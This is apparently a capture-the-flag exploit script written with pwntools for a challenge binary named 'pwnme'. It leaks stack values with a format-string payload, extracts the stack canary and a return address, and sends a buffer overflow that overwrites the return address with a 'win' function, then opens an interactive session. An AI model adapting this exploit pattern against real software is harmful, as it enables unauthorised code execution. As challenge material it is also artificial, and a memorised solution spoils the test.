from pwn import *
import sys

binary = context.binary = ELF("./pwnme")

if not args.REMOTE:
    p = process(binary.path)
else:
    p = remote('0.cloud.chals.io', 12229)

# Send leak
payload = b"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p  "
p.sendline(payload)

with open("payload", "wb") as fp:
    fp.write(payload + b"\n")

# Get canary and win address
tmp = p.readuntil("canary?")
tmp = p.readuntil("  ")
print(tmp)
tmp = tmp.decode().split()
print(tmp)
canary = int(tmp[12], 0)
print(hex(canary))
leak = int(tmp[-1], 0)
leak = leak - 0xa0              # offset from main ret address to win address
print(hex(leak))

payload =  b""
payload += b"A" * 24
payload += p64(canary)
payload += b"B" * 8
payload += p64(leak)

with open("payload", "ab") as fp:
    fp.write(payload)

p.sendline(payload)
p.interactive()